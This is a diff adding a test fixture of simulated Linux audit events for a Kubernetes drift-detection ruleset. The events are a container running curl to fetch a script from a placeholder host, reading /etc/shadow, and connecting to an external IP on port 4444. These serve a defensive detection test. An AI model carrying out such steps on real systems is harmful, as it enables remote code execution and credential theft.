@@ -1,0 +1,19 @@
+# Drift k8s-node events: each violates the redis SBoB on a Kubernetes node and
+# MUST fire the mapped drift rule, PLUS the attribution chain (100070 base +
+# 100071 podmap-unresolved when the podmap is not seeded with the pod uid
+# 0f3c8ed9-9d6b-4a1c-b5f2-7c1e0a9d1234; scripts/sbob-podmap-refresh.sh seeds
+# both spellings — seed the map and expect 100070 only).
+#   execve /usr/bin/curl          -> 100011 (SBoB drift: process ...)
+#   open /etc/shadow             -> 100021 (SBoB drift: file open ...)
+#   connect 185.220.101.4:4444   -> 100031 (SBoB drift: connect ...)
+# attribution (cgroup v2 underscore form on all three; the v2-dash and v1
+# forms are exercised in the benign corpus).
+
+type=SYSCALL msg=audit(1699999990.100:2001): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=2002 pid=3001 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-exec-redis" cgroup=/sys/fs/cgroup/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod0f3c8ed9_9d6b_4a1c_b5f2_7c1e0a9d1234.scope/cri-containerd-53b1a3e2c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9.scope
+type=EXECVE msg=audit(1699999990.100:2001): argc=3 a0="/usr/bin/curl" a1="-s" a2="http://update.example.invalid/x.sh"
+
+type=SYSCALL msg=audit(1699999991.200:2002): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis" cgroup=/sys/fs/cgroup/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod0f3c8ed9_9d6b_4a1c_b5f2_7c1e0a9d1234.scope/cri-containerd-53b1a3e2c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9.scope
+type=PATH msg=audit(1699999991.200:2002): item=0 name="/etc/shadow" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999992.300:2003): arch=c000003e syscall=42 success=yes exit=0 items=1 ppid=3002 pid=3003 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-connect-redis" cgroup=/sys/fs/cgroup/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod0f3c8ed9_9d6b_4a1c_b5f2_7c1e0a9d1234.scope/cri-containerd-53b1a3e2c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9.scope
+type=SOCKADDR msg=audit(1699999992.300:2003): saddr=0200115CB9DC65040000000000000000
